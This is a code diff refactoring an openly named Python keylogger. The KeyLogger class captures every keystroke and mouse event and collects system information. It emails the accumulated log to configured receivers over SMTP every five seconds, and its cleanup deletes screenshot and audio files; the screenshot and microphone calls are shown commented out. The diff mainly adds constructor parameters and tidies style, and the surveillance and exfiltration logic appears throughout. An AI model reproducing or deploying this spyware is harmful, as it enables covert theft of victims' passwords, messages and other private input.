@@ -2,8 +2,6 @@ import os
 import platform
 import socket
 import time
-
-# import threading
 import wave
 import pyscreenshot
 import sounddevice as sd
@@ -25,16 +23,28 @@ EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 SEND_REPORT_EVERY = 5  # seconds
-MAGIC_WORD="STOP"
+MAGIC_WORD = "STOP"
 
 
 class KeyLogger:
-    def __init__(self, time_interval, email, password):
+    def __init__(
+        self,
+        time_interval,
+        smtp_server,
+        smtp_port,
+        email_address,
+        email_password,
+        email_sender,
+        email_receiver,
+        cc,
+        magic_word
+    ):
         self.keyboard_listener = None
         self.mouse_listener = None
         self.interval = time_interval
         self.log = "KeyLogger Started...\n"
-        self.magic_word = ""
+        self.word = ""
+        self.magic_word = magic_word
 
     def appendlog(self, string):
         if string:
@@ -66,8 +76,8 @@ class KeyLogger:
                 current_key = "ESC"
             else:
                 current_key = " " + str(key) + " "
-        
-        self.magic_word = self.magic_word + current_key
+
+        self.word = self.word + current_key
         self.appendlog("\nPressed key: {0}".format(current_key))
 
     def send_mail(self, message):
@@ -88,14 +98,12 @@ class KeyLogger:
     def report(self):
         self.send_mail("\n\n\n" + self.log)
         print(self.log)
-        # timer = threading.Timer(self.interval, self.report)
-        # timer.start()
 
     def cleanup(self):
         self.log = ""
         self.keyboard_listener.stop()
         self.mouse_listener.stop()
-        self.magic_word = ""
+        self.word = ""
         delete_wav_and_png_files()
 
     def system_information(self):
@@ -131,7 +139,7 @@ class KeyLogger:
         self.appendlog("\nscreenshot used.")
 
     def run(self):
-        while(True):
+        while True:
             self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
             self.keyboard_listener.start()
 
@@ -139,6 +147,9 @@ class KeyLogger:
                 on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
             )
             self.mouse_listener.start()
+            self.system_information()
+            # self.screenshot()
+            # self.microphone()
 
             # if os.name == "nt":
             #     try:
@@ -160,17 +171,25 @@ class KeyLogger:
             #     except OSError:
             #         print("File is close.")
 
-            self.system_information()
-            # self.screenshot()
-            # self.microphone()
             time.sleep(SEND_REPORT_EVERY)
             self.report()
 
-            if MAGIC_WORD in self.magic_word:
+            if self.magic_word != "" and self.magic_word in self.word:
                 break
 
-            self.cleanup()
+            self.cleanup()  # this cleanup is used until the while loop works
+        self.cleanup()  # this cleanup is used when the while loop stops
 
 
-keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+keylogger = KeyLogger(
+    SEND_REPORT_EVERY,
+    SMTP_SERVER,
+    SMTP_PORT,
+    EMAIL_ADDRESS,
+    EMAIL_PASSWORD,
+    EMAIL_SENDER,
+    EMAIL_RECEIVER,
+    EMAIL_CC,
+    MAGIC_WORD
+)
 keylogger.run()
